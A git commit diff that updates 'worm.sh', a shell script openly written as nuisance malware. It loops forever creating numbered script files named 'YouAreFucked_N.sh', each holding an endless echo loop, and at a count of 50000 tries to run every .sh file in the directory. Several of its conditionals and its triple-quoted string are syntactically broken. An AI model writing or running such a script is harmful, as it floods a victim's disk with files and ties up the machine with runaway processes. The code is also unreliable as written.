f211918f7397257c4d5019205648b848c2d1cb27
Deus <119631661+OldKokoroz@users.noreply.github.com>
2023-12-31 11:44:00 +0300

    Update worm.sh

--- worm.sh
+++ worm.sh
@@ -1,31 +1,28 @@
-#!/bin/zsh
+#!/bin/bash
 
 
 context="""
-while True
-do
-  echo 'YOU ARE FUCKED'
-done
+while :
+  do
+    echo 'YOU ARE FUCKED'
+  done
 """
 
 Num=1
 
-while True
-do
-  echo "$context" > YouAreFucked_$Num.sh
-  Num=$Num+1
-  sleep 0,5
+while :
+  do
+    echo "$context" > YouAreFucked_$Num.sh
+    Num=$(( $Num+1 ))
 
-  if $Num -eq 50000
-  then
-    do
+    if $Num -eq 50000
+    then
       for wormed in $(pwd)/*.sh
-      do
-        if  $wormed != worm
-        then
-          bash $wormed
-        fi
-      done
-    done
-  fi
-done
+        do
+          if  $wormed != worm
+          then
+            bash $wormed
+          fi
+        done
+    fi
+  done
